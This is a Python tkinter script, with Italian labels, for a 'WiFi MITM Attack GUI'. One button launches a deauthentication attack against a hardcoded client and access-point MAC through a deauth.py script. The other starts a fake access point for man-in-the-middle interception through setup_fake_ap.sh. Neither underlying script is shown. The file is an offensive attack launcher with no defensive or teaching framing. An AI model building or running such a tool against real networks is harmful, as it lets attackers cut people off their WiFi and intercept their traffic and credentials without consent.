import tkinter as tk
from tkinter import messagebox, ttk
import subprocess

# --- CONFIGURAZIONE ---
INTERFACCIA_MONITOR = "wlan0mon"
MAC_CLIENT = "AA:BB:CC:DD:EE:FF"
MAC_AP = "11:22:33:44:55:66"

def run_deauth():
    try:
        subprocess.Popen([
            "sudo", "python3", "deauth.py",
            "-i", INTERFACCIA_MONITOR,
            "-t", MAC_CLIENT,
            "-a", MAC_AP
        ])
        messagebox.showinfo("Deauth", "Attacco deauth avviato.")
    except Exception as e:
        messagebox.showerror("Errore Deauth", str(e))

def start_fake_ap():
    try:
        subprocess.Popen(["bash", "setup_fake_ap.sh"])
        messagebox.showinfo("Fake AP", "Access Point fasullo avviato.")
    except Exception as e:
        messagebox.showerror("Errore AP", str(e))

root = tk.Tk()
root.title("WiFi MITM Tool")
root.geometry("340x200")

style = ttk.Style(root)

# Forza tema 'clam' che gestisce bene i colori
style.theme_use('clam')

# Configura stile pulsanti
style.configure('TButton',
                font=('Arial', 10, 'bold'),
                foreground='white',
                background='#3a7ff6')
style.map('TButton',
          background=[('active', '#005ce6')],
          foreground=[('active', 'white')])

# Sfondo finestra
root.configure(bg="#f0f0f0")

ttk.Label(root, text="WiFi MITM Attack GUI",
          font=("Arial", 14, "bold"),
          background="#f0f0f0",
          foreground="#333").pack(pady=10)

btn1 = ttk.Button(root, text="1. Disconnetti Utente", command=run_deauth)
btn1.pack(pady=10, ipadx=40)

btn2 = ttk.Button(root, text="2. Avvia WiFi Falsa + MITM", command=start_fake_ap)
btn2.pack(pady=10, ipadx=20)

root.mainloop()
